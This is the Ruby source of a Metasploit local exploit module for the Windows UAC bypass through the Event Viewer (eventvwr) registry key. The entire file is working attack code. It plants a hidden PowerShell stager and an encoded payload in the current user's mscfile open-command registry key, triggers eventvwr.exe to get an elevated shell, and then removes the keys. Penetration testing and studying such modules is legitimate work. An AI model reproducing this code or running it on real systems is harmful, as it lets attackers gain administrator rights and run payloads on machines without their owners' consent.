# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/exe&#039;
require &#039;msf/core/exploit/powershell&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::Powershell
  include Post::Windows::Priv
  include Post::Windows::Registry
  include Post::Windows::Runas

  EVENTVWR_DEL_KEY    = "HKCU\\Software\\Classes\\mscfile"
  EVENTVWR_WRITE_KEY  = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command"
  EXEC_REG_VAL        = &#039;&#039; # This maps to "(Default)"
  EXEC_REG_VAL_TYPE   = &#039;REG_SZ&#039;
  EVENTVWR_PATH       = "%WINDIR%\\System32\\eventvwr.exe"
  PSH_PATH            = "%WINDIR%\\System32\\WindowsPowershell\\v1.0\\powershell.exe"
  CMD_MAX_LEN         = 2081

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)&#039;,
      &#039;Description&#039;   => %q{
        This module will bypass Windows UAC by hijacking a special key in the Registry under
        the current user hive, and inserting a custom command that will get invoked when
        the Windows Event Viewer is launched. It will spawn a second shell that has the UAC
        flag turned off.

        This module modifies a registry key, but cleans up the key once the payload has
        been invoked.

        The module does not require the architecture of the payload to match the OS. If
        specifying EXE::Custom your DLL should call ExitProcess() after starting your
        payload in a separate process.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
          &#039;Matt Nelson&#039;,    # UAC bypass discovery and research
          &#039;Matt Graeber&#039;,   # UAC bypass discovery and research
          &#039;OJ Reeves&#039;       # MSF module
        ],
      &#039;Platform&#039;      => [&#039;win&#039;],
      &#039;Targets&#039;       => [
          [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X64 } ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;References&#039;    => [
        [
          &#039;URL&#039;, &#039;https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/&#039;,
          &#039;URL&#039;, &#039;https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1&#039;
        ]
      ],
      &#039;DisclosureDate&#039;=> &#039;Aug 15 2016&#039;
    ))
  end

  def check
    if sysinfo[&#039;OS&#039;] =~ /Windows (7|8|2008|2012|10)/ && is_uac_enabled?
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    commspec = &#039;%COMSPEC%&#039;
    registry_view = REGISTRY_VIEW_NATIVE

    # Make sure we have a sane payload configuration

    if sysinfo[&#039;Architecture&#039;] == ARCH_X64
      # On x64, check arch
      if session.arch == ARCH_X86
        # running WOW64, map the correct registry view
        registry_view = REGISTRY_VIEW_64_BIT

        if target_arch.first == ARCH_X64
          # we have an x64 payload specified while using WOW64, so we need to
          # move over to sysnative
          commspec = &#039;%WINDIR%\\Sysnative\\cmd.exe&#039;
        else
          # Else, we&#039;re 32-bit payload, so need to ref wow64.
          commspec = &#039;%WINDIR%\\SysWOW64\\cmd.exe&#039;
        end
      elsif target_arch.first == ARCH_X86
        # We&#039;re x64, but invoking x86, so switch to SysWOW64
        commspec = &#039;%WINDIR%\\SysWOW64\\cmd.exe&#039;
      end
    else
      # if we&#039;re on x86, we can&#039;t handle x64 payloads
      if target_arch.first == ARCH_X64
        fail_with(Failure::BadConfig, &#039;x64 Target Selected for x86 System&#039;)
      end
    end

    # Validate that we can actually do things before we bother
    # doing any more work
    check_permissions!

    case get_uac_level
      when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
        fail_with(Failure::NotVulnerable,
                  "UAC is set to &#039;Always Notify&#039;. This module does not bypass this setting, exiting..."
        )
      when UAC_DEFAULT
        print_good(&#039;UAC is set to Default&#039;)
        print_good(&#039;BypassUAC can bypass this setting, continuing...&#039;)
      when UAC_NO_PROMPT
        print_warning(&#039;UAC set to DoNotPrompt - using ShellExecute "runas" method instead&#039;)
        shell_execute_exe
        return
    end

    payload_value = rand_text_alpha(8)
    psh_path = expand_path("#{PSH_PATH}")

    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
    psh_payload = Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload.encoded)

    psh_stager = "\"IEX (Get-ItemProperty -Path #{EVENTVWR_WRITE_KEY.gsub(&#039;HKCU&#039;, &#039;HKCU:&#039;)} -Name #{payload_value}).#{payload_value}\""
    cmd = "#{psh_path} -nop -w hidden -c #{psh_stager}"

    existing = registry_getvaldata(EVENTVWR_WRITE_KEY, EXEC_REG_VAL, registry_view) || ""

    if existing.empty?
      registry_createkey(EVENTVWR_WRITE_KEY, registry_view)
    end

    print_status("Configuring payload and stager registry keys ...")
    registry_setvaldata(EVENTVWR_WRITE_KEY, EXEC_REG_VAL, cmd, EXEC_REG_VAL_TYPE, registry_view)
    registry_setvaldata(EVENTVWR_WRITE_KEY, payload_value, psh_payload, EXEC_REG_VAL_TYPE, registry_view)

    # We can&#039;t invoke EventVwr.exe directly because CreateProcess fails with the
    # dreaded 740 error (Program requires elevation). Instead, we must invoke
    # cmd.exe and use that to fire off the binary.
    cmd_path = expand_path(commspec)
    cmd_args = expand_path("/c #{EVENTVWR_PATH}")
    print_status("Executing payload: #{cmd_path} #{cmd_args}")

    # We can&#039;t use cmd_exec here because it blocks, waiting for a result.
    client.sys.process.execute(cmd_path, cmd_args, {&#039;Hidden&#039; => true})

    # Wait a copule of seconds to give the payload a chance to fire before cleaning up
    # TODO: fix this up to use something smarter than a timeout?
    Rex::sleep(5)

    handler(client)

    print_status("Cleaining up registry keys ...")
    if existing.empty?
      registry_deletekey(EVENTVWR_DEL_KEY, registry_view)
    else
      registry_setvaldata(EVENTVWR_WRITE_KEY, EXEC_REG_VAL, existing, EXEC_REG_VAL_TYPE, registry_view)
      registry_deleteval(EVENTVWR_WRITE_KEY, payload_value, registry_view)
    end

  end

  def check_permissions!
    fail_with(Failure::None, &#039;Already in elevated state&#039;) if is_admin? || is_system?

    # Check if you are an admin
    vprint_status(&#039;Checking admin status...&#039;)
    admin_group = is_in_admin_group?

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    end

    unless is_in_admin_group?
      fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
    end

    print_status(&#039;UAC is Enabled, checking level...&#039;)
    if admin_group.nil?
      print_error(&#039;Either whoami is not there or failed to execute&#039;)
      print_error(&#039;Continuing under assumption you already checked...&#039;)
    else
      if admin_group
        print_good(&#039;Part of Administrators group! Continuing...&#039;)
      else
        fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, &#039;Cannot BypassUAC from Low Integrity Level&#039;)
    end
  end
end

